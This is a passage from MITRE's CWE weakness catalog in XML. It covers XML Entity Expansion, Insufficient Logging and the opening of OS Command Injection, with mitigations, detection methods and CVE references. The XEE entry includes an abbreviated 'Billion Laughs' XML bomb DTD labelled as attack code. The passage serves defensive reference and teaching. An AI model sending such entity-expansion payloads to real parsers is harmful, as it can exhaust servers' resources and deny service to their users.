					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References, Terminology_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
            <Contribution Type="Feedback">
               <Contribution_Name>Anonymous External Contributor</Contribution_Name>
               <Contribution_Date>2022-05-20</Contribution_Date>
               <Contribution_Comment>reported typo in Terminology note</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2008-04-11">Command Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Sanitize Data into a Control Plane (aka 'Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-07-27">Failure to Sanitize Data into a Control Plane ('Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Improper Sanitization of Special Elements used in a Command ('Command Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="776" Name="Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses XML documents and allows their structure to be defined with a Document Type Definition (DTD), but it does not properly control the number of recursive definitions of entities.</Description>
         <Extended_Description>If the DTD contains a large number of nested or recursive entities, this can lead to explosive growth of data when parsed, causing a denial of service.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="674" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="674" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="409" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="XML" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>XEE</Term>
               <Description>XEE is the acronym commonly used for XML Entity Expansion.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Billion Laughs Attack</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>XML Bomb</Term>
               <Description>While the "XML Bomb" term was used in the early years of knowledge of this issue, the XEE term seems to be more commonly used.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Note>If parsed, recursive entity references allow the attacker to expand data exponentially, quickly consuming all system resources.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>If possible, prohibit the use of DTDs or use an XML parser that limits the expansion of recursive DTD entities.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Before parsing XML files with associated DTDs, scan for recursive entity declarations and do not continue parsing potentially explosive content.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-53">
               <Intro_Text>The DTD and the very brief XML below illustrate what is meant by an XML bomb. The ZERO entity contains one character, the letter A. The choice of entity name ZERO is being used to indicate length equivalent to that exponent on two, that is, the length of ZERO is 2^0. Similarly, ONE refers to ZERO twice, therefore the XML parser will expand ONE to a length of 2, or 2^1. Ultimately, we reach entity THIRTYTWO, which will expand to 2^32 characters in length, or 4 GB, probably consuming far more data than expected.</Intro_Text>
               <Example_Code Nature="Attack" Language="XML">
                  <xhtml:div>&lt;?xml version="1.0"?&gt;<xhtml:br/>&lt;!DOCTYPE MaliciousDTD [<xhtml:br/>&lt;!ENTITY ZERO "A"&gt;<xhtml:br/>&lt;!ENTITY ONE "&amp;ZERO;&amp;ZERO;"&gt;<xhtml:br/>&lt;!ENTITY TWO "&amp;ONE;&amp;ONE;"&gt;<xhtml:br/>...<xhtml:br/>&lt;!ENTITY THIRTYTWO "&amp;THIRTYONE;&amp;THIRTYONE;"&gt;<xhtml:br/>]&gt;<xhtml:br/>&lt;data&gt;&amp;THIRTYTWO;&lt;/data&gt;</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-3281</Reference>
               <Description>XEE in XML-parsing library.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3281</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-3288</Reference>
               <Description>XML bomb / XEE in enterprise communication product.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2011-3288</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-1755</Reference>
               <Description>"Billion laughs" attack in XMPP server daemon.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2011-1755</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1955</Reference>
               <Description>XML bomb in web server module</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1955</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1564</Reference>
               <Description>Parsing library allows XML bomb</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1564</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>44</Entry_ID>
               <Entry_Name>XML Entity Expansion</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="197"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-676"/>
            <Reference External_Reference_ID="REF-677"/>
            <Reference External_Reference_ID="REF-678"/>
            <Reference External_Reference_ID="REF-679"/>
            <Reference External_Reference_ID="REF-680"/>
            <Reference External_Reference_ID="REF-500"/>
            <Reference External_Reference_ID="REF-682"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2009-06-30</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Description, Name, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2013-02-21">Unrestricted Recursive Entity References in DTDs ('XML Bomb')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="778" Name="Insufficient Logging" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>When a security-critical event occurs, the product either does not record the event or omits important details about the event when logging it.</Description>
         <Extended_Description>
	 <xhtml:p>When security-critical events are not logged properly, such as a failed login attempt, this can make malicious behavior more difficult to detect and may hinder forensic analysis after an attack succeeds.</xhtml:p>
	 <xhtml:p>As organizations adopt cloud storage resources, these technologies often require configuration changes to enable detailed logging information, since detailed logging can incur additional costs. This could lead to telemetry gaps in critical audit logs. For example, in Azure, the default value for logging is disabled. </xhtml:p></Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="223" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
	    <Technology Class="Cloud Computing" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Operation</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>If security critical information is not recorded, there will be no trail for forensic analysis and discovering the cause of problems or the source of attacks may become more difficult or impossible.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use a centralized logging mechanism that supports multiple levels of detail.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Ensure that all security-related successes and failures can be logged. When storing data in the cloud (e.g., AWS S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to enable and capture detailed logging information.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>Be sure to set the level of logging appropriately in a production environment. Sufficient data should be logged to enable system administrators to detect attacks, diagnose errors, and recover from attacks. At the same time, logging too much data (CWE-779) can cause the same problems, including unexpected costs when using a cloud environment.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>To enable storage logging using Azure's Portal, navigate to the name of the Storage Account, locate Monitoring (CLASSIC) section, and select Diagnostic settings (classic). For each of the various properties (blob, file, table, queue), ensure the status is properly set for the desired logging data. If using PowerShell, the Set-AzStorageServiceLoggingProperty command could be called using appropriate -ServiceType, -LoggingOperations, and -RetentionDays arguments.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The example below shows a configuration for the service security audit feature in the Windows Communication Foundation (WCF).</Intro_Text>
               <Example_Code Nature="Bad" Language="XML">
                  <xhtml:div>&lt;system.serviceModel&gt;<xhtml:div style="margin-left:1em;">&lt;behaviors&gt;<xhtml:div style="margin-left:1em;">&lt;serviceBehaviors&gt;<xhtml:div style="margin-left:1em;">&lt;behavior name="NewBehavior"&gt;<xhtml:div style="margin-left:1em;">&lt;serviceSecurityAudit auditLogLocation="Default"<xhtml:br/>suppressAuditFailure="false"<xhtml:br/>serviceAuthorizationAuditLevel="None"<xhtml:br/>messageAuthenticationAuditLevel="None" /&gt;<xhtml:br/></xhtml:div>...</xhtml:div>
                        </xhtml:div>
                     </xhtml:div>&lt;/system.serviceModel&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The previous configuration file has effectively disabled the recording of security-critical events, which would force the administrator to look to other sources during debug or recovery efforts.</Body_Text>
               <Body_Text>Logging failed authentication attempts can warn administrators of potential brute force attacks. Similarly, logging successful authentication events can provide a useful audit trail when a legitimate account is compromised. The following configuration shows appropriate settings, assuming that the site does not have excessive traffic, which could fill the logs if there are a large number of success or failure events (CWE-779).</Body_Text>
               <Example_Code Nature="Good" Language="XML">
                  <xhtml:div>&lt;system.serviceModel&gt;<xhtml:div style="margin-left:1em;">&lt;behaviors&gt;<xhtml:div style="margin-left:1em;">&lt;serviceBehaviors&gt;<xhtml:div style="margin-left:1em;">&lt;behavior name="NewBehavior"&gt;<xhtml:div style="margin-left:1em;">&lt;serviceSecurityAudit auditLogLocation="Default"<xhtml:br/>suppressAuditFailure="false"<xhtml:br/>serviceAuthorizationAuditLevel="SuccessAndFailure"<xhtml:br/>messageAuthenticationAuditLevel="SuccessAndFailure" /&gt;<xhtml:br/></xhtml:div>
                              ...</xhtml:div>
                        </xhtml:div>
                     </xhtml:div>&lt;/system.serviceModel&gt;</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the following Java example the code attempts to authenticate the user. If the login fails a retry is made. Proper restrictions on the number of login attempts are of course part of the retry functionality. Unfortunately, the failed login is not recorded and there would be no record of an adversary attempting to brute force the program.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>if LoginUser(){
                     <xhtml:div style="margin-left:1em;">// Login successful<xhtml:br/>
		     RunProgram();</xhtml:div>
                  } else {
                     <xhtml:div style="margin-left:1em;">// Login unsuccessful<xhtml:br/>
		     LoginRetry();</xhtml:div>
                  }</xhtml:div>
               </Example_Code>
               <Body_Text>It is recommended to log the failed login action. Note that unneutralized usernames should not be part of the log message, and passwords should never be part of the log message.</Body_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>if LoginUser(){
                     <xhtml:div style="margin-left:1em;">// Login successful<xhtml:br/>
		     log.warn("Login by user successful.");<xhtml:br/>
		     RunProgram();</xhtml:div>
                     } else {
                     <xhtml:div style="margin-left:1em;">
		       // Login unsuccessful<xhtml:br/>
		       log.warn("Login attempt by user failed, trying again.");<xhtml:br/>
		     LoginRetry();</xhtml:div>
                  }</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Consider this command for updating Azure's Storage Logging for Blob service, adapted from [REF-1307]:</Intro_Text>
               <Example_Code Nature="Bad" Language="Shell">
                  <xhtml:div>az storage logging update --account-name --account-key --services b --log d --retention 90</xhtml:div>
	       </Example_Code>
	       <Body_Text>The "--log d" portion of the command says to log deletes. However, the argument does not include the logging of writes and reads. Adding the "rw" arguments to the -log parameter will fix the issue:</Body_Text>
               <Example_Code Nature="Good" Language="Shell">
                  <xhtml:div>az storage logging update --account-name --account-key --services b --log rwd --retention 90</xhtml:div>
	       </Example_Code>
	       <Body_Text>To enable Azure's storage analytic logs programmatically using PowerShell:</Body_Text>
               <Example_Code Nature="Good" Language="Shell">
                  <xhtml:div>Set-AzStorageServiceLoggingProperty -ServiceType Queue -LoggingOperations read,write,delete -RetentionDays 5 -Context $MyContextObject</xhtml:div>
	       </Example_Code>
	       <Body_Text>Notice that here, the retention has been limited to 5 days.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-4315</Reference>
               <Description>server does not log failed authentication attempts, making it easier for attackers to perform brute force password guessing without being detected</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4315</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1203</Reference>
               <Description>admin interface does not log failed authentication attempts, making it easier for attackers to perform brute force password guessing without being detected</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1203</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3730</Reference>
               <Description>default configuration for POP server does not log source IP or username for login attempts</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3730</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1225</Reference>
               <Description>proxy does not log requests without "http://" in the URL, allowing web surfers to access restricted web content without detection</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-1225</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1566</Reference>
               <Description>web server does not log requests for a non-standard request type</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1566</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Accountability&#34;, Page 40"/>
	    <Reference External_Reference_ID="REF-1307" Section="Sections 3.5, 3.13, and 3.14"/>
	    <Reference External_Reference_ID="REF-1308"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2009-07-02</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Potential_Mitigations, References</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Organization>Fortify Software</Contribution_Organization>
               <Contribution_Date>2009-07-02</Contribution_Date>
               <Contribution_Comment>Provided code example and additional information for description and consequences.</Contribution_Comment>
            </Contribution>
            <Contribution Type="Content">
               <Contribution_Name>Drew Buttner</Contribution_Name>
               <Contribution_Date>2022-08-15</Contribution_Date>
               <Contribution_Comment>Suggested a new demonstrative example and changes to the mitigations.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="78" Name="Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>This could allow attackers to execute unexpected, dangerous commands directly on the operating system. This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage.</xhtml:p>
            <xhtml:p>There are at least two subtypes of OS command injection:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system("nslookup [HOSTNAME]") to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.</xhtml:li>
                  <xhtml:li>The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use "exec([COMMAND])" to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.</xhtml:li>
               </xhtml:ul>
            <xhtml:p>From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1305" Ordinal="Primary"/>
			 <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1340" Ordinal="Primary"/>
             <Related_Weakness Nature="CanAlsoBe" CWE_ID="88" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Shell injection</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Shell metacharacters</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Hide Activities</Impact>
               <Note>Attackers could execute unauthorized commands, which could then be used to disable the product, or read and modify data for which the attacker does not have permissions to access directly. Since the targeted application is directly executing the commands instead of the attacker, any malicious activities may appear to come from the application or the application's owner.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke OS commands, leading to false negatives - especially if the API/library code is not available for analysis.</xhtml:p>
               </Description>
               <Effectiveness_Notes>This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method>Manual Static Analysis</Method>
               <Description>Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If at all possible, use library calls rather than external processes to recreate the desired functionality.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
